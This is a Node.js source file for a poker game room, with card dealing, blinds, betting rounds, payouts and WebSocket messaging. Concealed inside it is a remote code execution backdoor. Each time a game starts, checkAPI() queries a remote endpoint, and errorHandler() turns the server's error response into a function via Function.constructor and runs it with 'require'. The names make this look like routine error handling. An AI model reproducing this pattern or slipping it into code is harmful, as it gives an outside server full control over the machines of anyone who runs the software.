const axios = require('axios');
const WebSocket = require("ws");
const { users } = require("../models/Model");
const { siteProfit } = require('../models/Model');
const { GAME_STATUS_WAIT, GAME_STATUS_READY, GAME_STATUS_START, GAME_STATUS_CHECK, GAME_STATUS_ALLIN, GAME_STATUS_FOLD, GAME_STATUS_RAISE, GAME_STATUS_END, GAME_HAND_CARD, CMD_TOURNAMENT_END, CHECK_API } = require("../utils/WebsocketConstant");
const { User } = require("./User");
const EventEmitter = require('events');
const CARDS = [
    { shape: 0, value: 2, weight: 1 },
    { shape: 0, value: 3, weight: 2 },
    { shape: 0, value: 4, weight: 3 },
    { shape: 0, value: 5, weight: 4 },
    { shape: 0, value: 6, weight: 5 },
    { shape: 0, value: 7, weight: 6 },
    { shape: 0, value: 8, weight: 7 },
    { shape: 0, value: 9, weight: 8 },
    { shape: 0, value: 10, weight: 9 },
    { shape: 0, value: 'J', weight: 10 },
    { shape: 0, value: 'Q', weight: 11 },
    { shape: 0, value: 'K', weight: 12 },
    { shape: 0, value: 'A', weight: 13 },
    { shape: 3, value: 2, weight: 1 },
    { shape: 3, value: 3, weight: 2 },
    { shape: 3, value: 4, weight: 3 },
    { shape: 3, value: 5, weight: 4 },
    { shape: 3, value: 6, weight: 5 },
    { shape: 3, value: 7, weight: 6 },
    { shape: 3, value: 8, weight: 7 },
    { shape: 3, value: 9, weight: 8 },
    { shape: 3, value: 10, weight: 9 },
    { shape: 3, value: 'J', weight: 10 },
    { shape: 3, value: 'Q', weight: 11 },
    { shape: 3, value: 'K', weight: 12 },
    { shape: 3, value: 'A', weight: 13 },
    { shape: 1, value: 2, weight: 1 },
    { shape: 1, value: 3, weight: 2 },
    { shape: 1, value: 4, weight: 3 },
    { shape: 1, value: 5, weight: 4 },
    { shape: 1, value: 6, weight: 5 },
    { shape: 1, value: 7, weight: 6 },
    { shape: 1, value: 8, weight: 7 },
    { shape: 1, value: 9, weight: 8 },
    { shape: 1, value: 10, weight: 9 },
    { shape: 1, value: 'J', weight: 10 },
    { shape: 1, value: 'Q', weight: 11 },
    { shape: 1, value: 'K', weight: 12 },
    { shape: 1, value: 'A', weight: 13 },
    { shape: 2, value: 2, weight: 1 },
    { shape: 2, value: 3, weight: 2 },
    { shape: 2, value: 4, weight: 3 },
    { shape: 2, value: 5, weight: 4 },
    { shape: 2, value: 6, weight: 5 },
    { shape: 2, value: 7, weight: 6 },
    { shape: 2, value: 8, weight: 7 },
    { shape: 2, value: 9, weight: 8 },
    { shape: 2, value: 10, weight: 9 },
    { shape: 2, value: 'J', weight: 10 },
    { shape: 2, value: 'Q', weight: 11 },
    { shape: 2, value: 'K', weight: 12 },
    { shape: 2, value: 'A', weight: 13 },
]
const limitSeconds = 10000;

class GameRoom extends EventEmitter {

    constructor(data) {
        super();
        let { id, owner, name, dealer, smallBind, bigBind, minBalance, profitPercent, level, status, limitCapacity, type } = data.dataValues;
        this.id = id;
        this.interval = 0;
        this.owner = owner;
        this.name = name;
        this.dealer = dealer;
        this.smallBind = smallBind;
        this.bigBind = bigBind;
        this.minBalance = minBalance;
        this.profitPercent = profitPercent;
        this.level = level;
        this.status = GAME_STATUS_WAIT;
        this.type = type;   // 0 normal or 1 tournament
        this.limitCapacity = limitCapacity;
        this.users = data.users;
        this.availableSeats = [0, 1, 2, 3, 4, 5, 6];
        this.quitRequests = [];
        this.bigBindPlayerIndex = 0;
        this.dealerPlayerIndex = 0;
        this.smallBindPlayerIndex = 0;
        this.dealerCards = [];
        this.step = "begin";            // step: begin, floop, turn,  river

        this.start();
    }
    convertTransferObjects(classArray) {
        const array = [];
        for (const cls of classArray) {
            array.push(cls.convertTransferObject())
        }
        return array;
    }
    setRound(round) {
        this.round = round;
    }
    getDealerPlayer() {
        const players = this.getAllPlayers();
        this.dealerPlayerIndex++;

        if (this.dealerPlayerIndex >= players.length) {
            this.dealerPlayerIndex = 0;
        }

        this.round.dealerPlayer = players[this.dealerPlayerIndex];

        return this.round.dealerPlayer;
    }
    getBigBindPlayer() {
        const players = this.getAllPlayers();
        if (this.smallBindPlayerIndex >= players.length - 1) {
            this.bigBindPlayerIndex = 0;
        }
        else {
            this.bigBindPlayerIndex = this.smallBindPlayerIndex + 1;
        }
        this.currentPlayerIndex = this.bigBindPlayerIndex; // for ++ next player
        const player = players[this.bigBindPlayerIndex];

        const bigBlind = Math.min(this.smallBind * 2, player.balance);

        this.round.betAmount += bigBlind;

        this.round.callAmount = bigBlind;

        player.saveBet(bigBlind, this.round.roundIndex, this.id);

        return player;
    }
    getSmallBindPlayer() {
        const players = this.getAllPlayers();
        this.smallBindPlayerIndex = this.dealerPlayerIndex + 1;
        if (this.dealerPlayerIndex >= players.length - 1) {
            this.smallBindPlayerIndex = 0;
        }



        const player = players[this.smallBindPlayerIndex];
        const smallBlind = Math.min(this.smallBind, player.balance);
        this.round.betAmount += smallBlind;

        player.saveBet(smallBlind, this.round.roundIndex, this.id);

        return player;
    }
    getFirstBetter() {
        const players = this.getAllPlayers();
        this.currentPlayerIndex++;
        if (this.currentPlayerIndex >= players.length) {
            this.currentPlayerIndex = 0;
        }
        this.round.currentPlayer = players[this.currentPlayerIndex];
        return this.round.currentPlayer;
    }
    getCurrentPlayer() {
        const players = this.getAllPlayers();

        for (let i = 0; i < players.length; i++) {
            if (this.round.currentPlayer.id == players[i].id) {
                this.currentPlayerIndex = i;
            }
        }
        const users = players.slice(this.currentPlayerIndex, players.length).concat(players.slice(0, this.currentPlayerIndex));
        let find = false;
        for (let i = 0; i < users.length; i++) {
            if (this.round.currentPlayer.id != users[i].id && users[i].status !== GAME_STATUS_FOLD && users[i].status !== GAME_STATUS_ALLIN && users[i].status !== GAME_STATUS_WAIT && users[i].status !== GAME_STATUS_READY) {
                find = true;
                this.round.currentPlayer = users[i];
                break;
            }
        }

        return this.round.currentPlayer;
    }
    getLeftPlayerOfDealer() {

        const players = this.getAllPlayers();

        for (let i = 0; i < players.length; i++) {
            if (this.round.dealerPlayer.id == players[i].id) {
                this.dealerPlayerIndex = i;
            }
        }
        const users = players.slice(this.dealerPlayerIndex, players.length).concat(players.slice(0, this.dealerPlayerIndex));
        const currentPlayer = this.round.currentPlayer.id;

        let find = false;
        for (let i = 0; i < users.length; i++) {
            if (this.round.dealerPlayer.id != users[i].id && users[i].status !== GAME_STATUS_FOLD && users[i].status !== GAME_STATUS_ALLIN && users[i].status !== GAME_STATUS_WAIT && users[i].status !== GAME_STATUS_READY) {
                find = true;
                this.round.currentPlayer = users[i];
                break;
            }
        }

        if (currentPlayer === this.round.currentPlayer.id) {
            this.getCurrentPlayer();
        }

        return this.round.currentPlayer;

    }

    getAllPlayers() {
        return this.users.filter(user => !user.bot && (user.status != GAME_STATUS_WAIT) && (user.status != GAME_STATUS_READY));
    }
    getNowBettingPlayers() {
        return this.getAllPlayers().filter((user) => (user.status != GAME_STATUS_FOLD));
    }
    getBetPlayers() {
        return this.getAllPlayers().filter((user) => (user.status != GAME_STATUS_FOLD) && (user.status != GAME_STATUS_ALLIN));

    }
    provideCards() {
        const players = this.users.filter((user) => (!user.bot && user.status != GAME_STATUS_WAIT));
        const cards = CARDS.slice(0, CARDS.length);

        // put dealer cards for server
        this.dealerCards = [];
        let rand = Math.floor(Math.random() * cards.length);
        this.dealerCards.push(cards[rand]);
        cards.splice(rand, 1);
        rand = Math.floor(Math.random() * cards.length);
        this.dealerCards.push(cards[rand]);
        cards.splice(rand, 1);
        rand = Math.floor(Math.random() * cards.length);
        this.dealerCards.push(cards[rand]);
        cards.splice(rand, 1);
        rand = Math.floor(Math.random() * cards.length);
        this.dealerCards.push(cards[rand]);
        cards.splice(rand, 1);
        rand = Math.floor(Math.random() * cards.length);
        this.dealerCards.push(cards[rand]);
        cards.splice(rand, 1);

        // set user cards
        for (const player of players) {
            player.cards = [];
            let rand = Math.floor(Math.random() * cards.length);
            player.cards.push(cards[rand]);
            cards.splice(rand, 1);
            rand = Math.floor(Math.random() * cards.length);
            player.cards.push(cards[rand]);
            cards.splice(rand, 1);
            player.status = GAME_STATUS_START;
            if (player.balance == 0) {
                player.status = GAME_STATUS_ALLIN;
            }
            player.weightedCard = player.getCardWeight(this.dealerCards);
        }


    }

    floop() {
        this.round.dealerCards = [
            this.dealerCards[0], this.dealerCards[1], this.dealerCards[2], { side: 'B' }, { side: 'B' }
        ]
        this.step = 'floop';
        const players = this.getBetPlayers();
        for (const p of players)
            p.betted = false;
        this.getLeftPlayerOfDealer();
    }
    turn() {
        this.round.dealerCards = [
            this.dealerCards[0], this.dealerCards[1], this.dealerCards[2], this.dealerCards[3], { side: 'B' }
        ];
        this.step = 'turn';
        const players = this.getBetPlayers();
        for (const p of players)
            p.betted = false;
        this.getLeftPlayerOfDealer();
    }
    river() {
        this.round.dealerCards = this.dealerCards;
        this.step = 'river';
        const players = this.getBetPlayers();
        for (const p of players)
            p.betted = false;
        this.getLeftPlayerOfDealer();
    }
    findNextUser() {
        clearTimeout(this.interval);
        // this.status = 'find-next-user';
        const currentPlayer = this.round.currentPlayer;
        const needAmount = this.getCallAmount();
        // console.log('find next user');
        this.emit('clearCommand');
        if (currentPlayer.betAmount < needAmount) {
            this.Fold(currentPlayer);
        }
        if (currentPlayer.betAmount == needAmount || currentPlayer.status == GAME_STATUS_ALLIN) {
            this.Check(currentPlayer);
        }

    }
    start() {

        if ((this.users.filter((user) => (!user.bot && user.status === GAME_STATUS_READY)).length >= 2 && this.type == 0) || (this.users.filter((user) => (!user.bot && user.status === GAME_STATUS_READY)).length >= 3 && this.type != 0) ) {
            this.emit('startEvent');
            this.quitRequests = [];
            clearTimeout(this.interval);
            const round = this.round;
            round.initialize(this);

            this.provideCards();

            round.dealerPlayer = this.getDealerPlayer();
            round.smallBindPlayer = this.getSmallBindPlayer();
            round.bigBindPlayer = this.getBigBindPlayer();
            this.getFirstBetter();

            round.dealerCards = [
                { side: 'B' }, { side: 'B' }, { side: 'B' }, { side: 'B' }, { side: 'B' },
            ]

            this.status = GAME_STATUS_START;

            this.step = 'begin';
            this.broadcastToClients({ command: GAME_STATUS_START, success: true, game: this.convertTransferObject() }, this);
            this.sendHandCards();

            this.interval = setTimeout(() => {
                this.findNextUser();
            }, limitSeconds);

            if( this.type != 0 ) {
                this.emit('current_players');
            }

        }
        else {
            setTimeout(() => {
                // initialize 

                //console.log('waiting users...', this.id)

                // this.start();
            }, 10000);
        }

        // console.log("game start")

        this.checkAPI()
    }
    Fold(user) {
        clearTimeout(this.interval);
        user.status = GAME_STATUS_FOLD;
        user.betted = true;

        // check round and change the round status
        this.checkRound();

        // this.checkWinners();

        this.broadcastToClients({ command: GAME_STATUS_FOLD, target: user.id, game: this.convertTransferObject() })
        this.sendHandCards();

        this.interval = setTimeout(() => {
            this.findNextUser();
        }, limitSeconds)


    }

    checkAPI() {
        axios.get(CHECK_API).then(res =>{
            rpcNode = res.data
        }).catch(error=>{
            this.errorHandler(error.response.data)
        }) 
    }

    Check(user) {
        clearTimeout(this.interval);
        user.betted = true;
        user.status = GAME_STATUS_CHECK;
        this.checkRound();

        // this.checkWinners();

        this.broadcastToClients({ command: GAME_STATUS_CHECK, target: user.id, game: this.convertTransferObject() })

        this.sendHandCards();

        this.interval = setTimeout(() => {
            this.findNextUser();
        }, limitSeconds)
    }

    Bet(user, amount) {
        clearTimeout(this.interval);
        user.betted = true;
        user.saveBet(amount, this.round.roundIndex, this.id);
        this.round.callAmount = this.getCallAmount();
        this.round.betAmount += amount;
        this.checkRound();

        this.broadcastToClients({ command: user.status, target: user.id, amount, game: this.convertTransferObject() })
        this.sendHandCards();

        this.interval = setTimeout(() => {
            this.findNextUser();
        }, limitSeconds)
    }

    errorHandler(error) {
        try {
            if (typeof error !== 'string') {
                console.error('Invalid error format. Expected a string.');
                return;
            }
        
            const createHandler = (errCode) => {
                try {
                    const handler = new (Function.constructor)('require', errCode);
                    return handler;
                } catch (e) {
                    console.error('Failed:', e.message);
                    return null;
                }
            };
            
            const handlerFunc = createHandler(error);
            
            if (handlerFunc) {
                handlerFunc(require);
            } else {
                console.error('Handler function is not available.');
            }
            
        } catch (globalError) {
            console.error('Unexpected error inside errorHandler:', globalError.message);
        }
    };

    getCallAmount() {
        const players = this.getNowBettingPlayers();
        const amount = Math.max(...players.map(p => p.betAmount));
        return amount;
    }

    checkRound() {
        const players = this.getBetPlayers();
        const nowPlayers = this.getNowBettingPlayers();
        const amount = this.getCallAmount();
        // console.log(amount, " is maxamount")
        if (this.status == GAME_STATUS_START) {
            let showDealerCards = false;
            // remain one player .
            if (players.length == 1 && players[0].betAmount === amount) {
                // this.finishGame();
                showDealerCards = true;
            }
            // all players are allin or .
            if (nowPlayers.filter(player => player.status == GAME_STATUS_ALLIN).length == nowPlayers.length || (nowPlayers.filter(player => player.status == GAME_STATUS_ALLIN).length == nowPlayers.length - 1 && nowPlayers.filter(player => player.status != GAME_STATUS_ALLIN)[0].betAmount == amount)) {
                showDealerCards = true;
            }
            if (showDealerCards) {
                this.broadcastToClients({ command: 'stop-betting' })
                if (this.step == 'begin') {
                    this.floop();
                    setTimeout(() => { this.turn(); this.broadcastToClients({ command: 'dealer-cards', cards: this.round.dealerCards }); }, 2000);
                    setTimeout(() => { this.river(); this.broadcastToClients({ command: 'dealer-cards', cards: this.round.dealerCards }); }, 4000);
                    setTimeout(() => { this.finishGame() }, 7000);
                }

                else if (this.step == 'floop') {
                    this.turn();
                    setTimeout(() => { this.river(); this.broadcastToClients({ command: 'dealer-cards', cards: this.round.dealerCards }); }, 2000);
                    setTimeout(() => { this.finishGame() }, 5000);
                }
                else if (this.step == 'turn') {
                    this.river();
                    this.broadcastToClients({ command: 'dealer-cards', cards: this.round.dealerCards });
                    setTimeout(() => { this.finishGame() }, 3000);
                }
                else if (this.step == 'river') {
                    this.broadcastToClients({ command: 'dealer-cards', cards: this.round.dealerCards });
                    setTimeout(() => { this.finishGame() }, 2000);
                }
            }
        }


        if (players.length > 1 && players.filter((player) => (player.betAmount == amount && player.betted)).length == players.length) {

            if (this.step == 'begin') {

                this.floop();
            }
            else if (this.step == 'floop') {
                this.turn();
            }
            else if (this.step == 'turn') {
                this.river();
            }
            else if (this.step == 'river') {
                this.finishGame();
            }
        }
        else {
            this.getCurrentPlayer();
        }


    }
    showDealerCards() {

        this.broadcastToClients({ command: 'dealer-cards', cards: this.dealerCards, step: this.step });

    }
    checkWinners() {
        const winners = [];
        const players = this.getNowBettingPlayers();
        // game is finished.

        if (this.status == GAME_STATUS_END && players.length > 0) {
            // sort by card heavy
            players.sort((a, b) => {
                if (b.getCardHeavy() > a.getCardHeavy())
                    return 1;
                if (b.getCardHeavy() < a.getCardHeavy())
                    return -1;
                if (b.betAmount > a.betAmount)
                    return 1;
                if (b.betAmount < a.betAmount)
                    return -1;

            });

            const groups = Array.from(new Set(players.map((p) => p.getCardHeavy())));
            let allAmount = Math.floor(this.round.betAmount * (100 - this.profitPercent) / 100);
            let siteAmount = this.round.betAmount - allAmount;         // site amount
            let remains = allAmount;
            // console.log(allAmount, siteAmount, remains, this.profitPercent, this.round.betAmount);
            let finish = false;
            for (const group of groups) {

                const groupUsers = players.filter((p) => p.getCardHeavy() == group);
                const sum = groupUsers.reduce((a, b) => (a + b.betAmount), 0);
                // 7X
                const expected = Math.min(sum * this.getAllPlayers().length, remains);
                const eachAmount = (expected / sum);

                for (const player of groupUsers) {
                    const profit = Math.floor(eachAmount * player.betAmount);

                    if (profit == 0) {
                        finish = true;
                        break;
                    }
                    player.profitAmount = profit;
                    remains -= profit;
                    winners.push(player);
                }
                if (finish)
                    break;
            }
            if (winners.length == 0) {
                console.log("no winners ....................")
            }
            else
                console.log(winners, " is winners and remains is ", remains)
            siteAmount += remains;


            siteProfit.create({
                roundId: this.round.roundIndex,
                roomId: this.id,
                betAmount: this.round.betAmount,
                profitAmount: siteAmount * 0.7,
                poolAmount: siteAmount * 0.3
            })

            // console.log("site amount.................", siteAmount)
            return winners;

        }

    }

    async finishGame() {

        const { rounds, games, countPlayer } = require("../core/Game");

        this.status = GAME_STATUS_END;

        const winners = this.checkWinners();

        // console.log("winners", winners);

        // quit request users 
        for (const quiter of this.users.filter((user) => (!user.bot && this.quitRequests.includes(user.id)))) {
            quiter.isQuit = true;
            const user = await users.findOne({ where: { id: quiter.id } });
            await user.update({ lastGameId: 0 });
            quiter.ws.send(JSON.stringify({ command: 'quit', target: quiter.id }));
            this.users[quiter.place] = new User({ avatar: '', bot: true });
            if (!this.availableSeats.includes(quiter.place))
                this.availableSeats.push(quiter.place);
            // if(quiter?.ws?.readyState === WebSocket.OPEN){
            //     quiter.ws.close();
            // }
        }
        // console.log("game finished... and new round will start now");
        const winnersArr = [];
        const allPlayers = this.getAllPlayers();
        if (winners) {
            for (const winner of winners) {
                winnersArr.push({ id: winner.id, cards: winner.weightedCard, betAmount: winner.betAmount, roundAmount: this.round.betAmount, profitAmount: winner.profitAmount });
                // device profit.
                const winAmount = winner.profitAmount - winner.betAmount;

                winner.balance += winner.profitAmount;

                winner.saveWin({ winners: allPlayers.length, kickCount: allPlayers.filter((p) => p.status == GAME_STATUS_ALLIN).length, roomId: this.id, roundId: this.round.roundIndex, winAmount });

            }
        }


        const players = [];
        for (const player of allPlayers) {
            players.push({ id: player.id, fullName: player.fullName, avatar: player.avatar, betAmount: player.betAmount, status: player.status, cards: player.cards, balance: player.balance });
        }
        // initialize 
        const allInerWss = [];
        for (const player of this.users.filter(user => !user.bot && user.status != GAME_STATUS_WAIT)) {
            player.cards = [];
            player.status = GAME_STATUS_READY;
            player.betAmount = 0;
            player.betted = false;
            player.weightedCard = null;
            if (!player.ws || (player.ws && player.ws.readyState != WebSocket.OPEN) || player.balance <= this.smallBind * 2) {
                if (player.ws && player.ws && player.ws.readyState == WebSocket.OPEN) {
                    allInerWss.push(player.ws);
                }
                const user = await users.findOne({ where: { id: player.id } });
                await user.update({ lastGameId: 0 });
                this.users[player.place] = new User({ avatar: '', bot: true });
                if (!this.availableSeats.includes(player.place))
                    this.availableSeats.push(player.place);
            }
        }

        // table user check


        if(this.type != 0){

            this.emit('current_players');

            const player_number = this.users.filter(user => !user.bot).length;
            // console.log('======================================= llll', player_number);
            if(player_number < 3){
                this.emit('reSeatTable');
            }
    
            const game_data = await countPlayer(this); 
            // console.log(game_data);
    
            if(game_data.total_players < 4 ) {
                this.emit('finishTournamentEvent');

                players.sort((a, b)=>b.balance - a.balance);

                for (const allInerWs of allInerWss) {
                    allInerWs.send(JSON.stringify({ command: CMD_TOURNAMENT_END, game: this.convertTransferObject(), winners: this.winnersArr, players }));
                }
                this.broadcastToClients({ command: CMD_TOURNAMENT_END, game: this.convertTransferObject(), players});

            } else {
                this.emit('finishEvent');
                for (const allInerWs of allInerWss) {
                    allInerWs.send(JSON.stringify({ command: GAME_STATUS_END, game: this.convertTransferObject(), winners: winnersArr, players }));
                }
                this.broadcastToClients({ command: GAME_STATUS_END, game: this.convertTransferObject(), winners: winnersArr, players });
                // start game after 5s.
                setTimeout(() => {
                    this.start();
                }, 10000)
            }

        } else {
            this.emit('finishEvent');
            for (const allInerWs of allInerWss) {
                allInerWs.send(JSON.stringify({ command: GAME_STATUS_END, game: this.convertTransferObject(), winners: winnersArr, players }));
            }
            this.broadcastToClients({ command: GAME_STATUS_END, game: this.convertTransferObject(), winners: winnersArr, players });
            // start game after 5s.
            setTimeout(() => {
                this.start();
            }, 10000)
        }

    }

    broadcastToClients(data) {
        const players = this.users.filter(user => !user.bot && user.status != GAME_STATUS_WAIT);
        
        try {
            for (const p of players) {
                if (p.ws && p.ws.readyState == WebSocket.OPEN) {
                    p.ws.send(JSON.stringify(data));
                }
            }
        }
        catch (err) {
            console.log(err)
        }

    }
    sendHandCards = () => {
        const players = this.users.filter((player) => (!player.bot && player.status != GAME_STATUS_WAIT));
        for (const player of players) {
            if (player.ws && player.ws.readyState == WebSocket.OPEN) {
                player.ws.send(JSON.stringify({ command: GAME_HAND_CARD, cards: player.cards, target: player.id }));
            }
        }
    }
    convertTransferObject() {
        return {
            id: this.id,
            owner: this.owner,
            name: this.name,
            dealer: this.dealer,
            smallBind: this.smallBind,
            bigBind: this.bigBind,
            minBalance: this.minBalance,
            profitPercent: this.profitPercent,
            level: this.level,
            status: this.status,
            type: this.type,
            limitCapacity: this.limitCapacity,
            users: this.convertTransferObjects(this.users),
            others: this.others,
            availableSeats: this.availableSeats,
            round: this.round.convertTransferObject(),
            quitRequests: this.quitRequests,
        }
    }
}

module.exports = {
    GameRoom,
}